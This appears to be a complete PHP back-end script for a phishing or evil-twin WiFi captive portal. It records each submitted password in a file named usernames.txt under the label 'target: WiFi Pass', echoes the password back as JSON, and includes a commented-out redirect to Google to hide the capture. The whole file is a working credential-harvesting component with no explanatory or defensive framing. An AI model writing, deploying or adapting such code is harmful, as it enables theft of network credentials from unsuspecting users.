<?php

    file_put_contents("usernames.txt", "target: WiFi Pass: " . $_POST['password'] . "\n", FILE_APPEND);
    // header('Location: https://www.google.com/');
    header("Content-Type: application/json;charset=utf-8");
    $response = array(
        'password' => $_POST['password']
    );
    echo json_encode($response);

?>